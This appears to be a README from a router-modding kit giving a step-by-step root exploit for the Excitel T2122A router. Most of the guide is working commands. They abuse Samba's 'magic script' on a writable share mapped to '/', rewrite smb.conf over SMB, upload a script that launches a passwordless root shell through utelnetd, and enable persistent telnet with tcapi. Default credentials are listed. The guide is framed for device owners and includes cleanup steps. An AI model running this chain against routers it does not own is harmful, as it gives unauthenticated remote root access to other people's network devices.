# Root shell over Samba (no firmware flash)

This is the route that worked on the Excitel T2122A. It abuses Samba's classic
`magic script` feature: the stock Samba share maps to `/` and runs as root, so a
file uploaded with the configured name is executed as root when the client
closes it. It does not modify the firmware and survives nothing — it is a
one-shot root shell. Use it to inspect the device, dump the flash, or enable the
persistent vendor telnet.

> Only do this on a device you own. The share is unauthenticated by design on
> many units; anyone on the LAN can use it while it is enabled.

## 0. Before you start

- The router must be booted into the **stock vendor firmware** (not OpenWrt).
- Samba must be enabled. On Excitel it is off after a factory reset.
- You need `smbclient` on your Linux host (`samba-client` package).
- Default share credentials are `admin` / `1234`. The share is `Samba_Share`
  and its local path is `/`.
- Samba may take ~30 s after boot to listen on 445. If the port is closed, open
  `http://192.168.1.1/cgi-bin/app-samba.asp` once and press **Apply**; that
  starts it.

## 1. Enable the share

In the stock web UI:

1. Log in (Excitel default: `excitel` / `exc@123`; the password may have been
   changed by your ISP).
2. Go to **APP → Samba** (direct URL: `http://192.168.1.1/cgi-bin/app-samba.asp`).
3. Set Samba to **Enable**.
4. Make sure `Samba_Share` is present, path `/`, writable, user `admin`,
   password `1234`.
5. Apply. Wait until TCP 445 answers.

From the host:

```sh
nc -vz 192.168.1.1 445
```

## 2. Add `magic script` to the router's `smb.conf`

The share is writable all the way to `/`, so the Samba config can be edited over
SMB. Use the SMB1 client config in this kit; modern `smbclient` refuses this old
server by default.

```sh
cd unlocked-GX-Titatnium-2122A   # or whatever you named the clone
SMB="smbclient -s tools/smb.conf //192.168.1.1/Samba_Share -U admin%1234"

# download the live config
$SMB -c 'get /etc/samba/smb.conf /tmp/smb_router.conf'

# insert one line into [Samba_Share]
python3 - <<'PY'
p = '/tmp/smb_router.conf'
s = open(p).read()
needle = '[Samba_Share]\npath = /\n'
assert needle in s, 'Samba_Share section not found; adjust the path line'
if 'magic script' not in s:
    s = s.replace(needle, needle + 'magic script = telnet_start.sh\n', 1)
    open(p, 'w').write(s)
    print('added magic script')
else:
    print('already present')
PY

# upload it back
$SMB -c 'put /tmp/smb_router.conf /etc/samba/smb.conf'
```

Samba re-reads the share definition for new connections on this build, so a
restart is normally not needed. If the trigger below does nothing, toggle Samba
off/on in the web UI and try again.

## 3. Trigger the script

The `magic script` name is relative to the share. Upload a file with exactly
that name and the commands you want to run. Samba executes it as root when the
upload completes.

```sh
cat > /tmp/telnet_start.sh <<'EOF'
#!/bin/sh
/usr/bin/utelnetd -p 23 -l /bin/sh -d
EOF

$SMB -c 'put /tmp/telnet_start.sh /tmp/telnet_start.sh'
sleep 2
nc -vz 192.168.1.1 23
```

If port 23 is open, connect:

```sh
telnet 192.168.1.1 23
# or: nc 192.168.1.1 23
id
# uid=0(root) gid=0(root)
```

No password is asked because the script starts `utelnetd` with `-l /bin/sh`
directly.

The script in this kit automates steps 2–3:

```sh
./tools/samba_telnet.sh 192.168.1.1 admin 1234
```

## 4. Make access survive a reboot

Port 23 is started from RAM and disappears on reboot. The reliable persistent
path on the vendor firmware is the built-in telnet service, which is controlled
by `tcapi` and listens on **56090**:

```sh
/userfs/bin/tcapi set Account_TelnetEntry Active Yes
/userfs/bin/tcapi set Account_TelnetEntry telnet_active Yes
/userfs/bin/tcapi set System_Entry telnet_enable 1
/userfs/bin/tcapi commit Account_TelnetEntry
/userfs/bin/tcapi commit System_Entry
/userfs/bin/tcapi save
```

After a reboot:

```sh
telnet 192.168.1.1 56090
# login: excitel
# password: the MAC address on the label, lowercase, no separators
```

The vendor service runs `/usr/bin/utelnetd -p 56090 -l /bin/login -d`, so you
get a normal login and a root shell after authentication.

Do **not** rely on editing `/etc/inittab`. It looks like the obvious place, but
on this firmware the added `::once:` line did not start `utelnetd`; the Samba
magic script did. `/etc` is also rebuilt at boot, so the edit would be lost.

## 5. If it does not work

| Symptom | Cause / fix |
|---|---|
| `NT_STATUS_IO_TIMEOUT` or protocol error | `smbclient` is using SMB2. Use the supplied `tools/smb.conf` (forces NT1). |
| `NT_STATUS_LOGON_FAILURE` | Share password is not the default `1234`; reset Samba in the web UI. |
| `NT_STATUS_OBJECT_NAME_NOT_FOUND` on `get` | The share root is not `/` on your variant. List it with `$SMB -c 'ls'` and locate `etc/samba/smb.conf`. |
| Port 445 closed | Samba is off. Open the Samba page once; wait 30 s. |
| `magic script` line present, port 23 still closed | Toggle Samba off/on, then upload the trigger again. Check that `utelnetd` exists: `ls -l /usr/bin/utelnetd`. |
| Port 23 opens then closes immediately | `utelnetd` syntax differs. Try `/usr/bin/utelnetd -p 23 -l /bin/sh -d -i` or use `-l /bin/login`. |

## 6. Clean up

When you are done, remove the magic line from `/etc/samba/smb.conf` and turn
Samba off again if you do not need it:

```sh
$SMB -c 'get /etc/samba/smb.conf /tmp/smb_router.conf'
sed -i '/^magic script = telnet_start.sh$/d' /tmp/smb_router.conf
$SMB -c 'put /tmp/smb_router.conf /etc/samba/smb.conf'
```

Leaving it in place is a permanent remote-root hole for anyone who can reach
port 445.
